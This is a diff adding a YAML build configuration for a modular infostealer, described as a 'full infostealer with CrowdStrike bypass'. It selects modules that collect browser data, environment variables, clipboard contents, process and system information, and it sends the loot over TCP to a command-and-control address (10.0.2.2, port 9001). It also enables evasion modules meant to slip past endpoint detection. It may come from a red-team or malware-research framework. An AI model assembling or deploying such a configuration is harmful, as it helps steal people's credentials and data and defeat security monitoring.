@@ -1,0 +1,21 @@
+name: infostealer_cs_dynamic_full
+description: Full infostealer with CrowdStrike bypass
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info_api
+- collectors/processes_api
+- collectors/browser_chromium
+- collectors/env_vars
+- collectors/clipboard
+exfil: exfil/tcp_dynamic
+arch: arch/sequential
+resources: true
+evasion:
+- evasion/iat_pad
+- evasion/behavioral_pacing
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
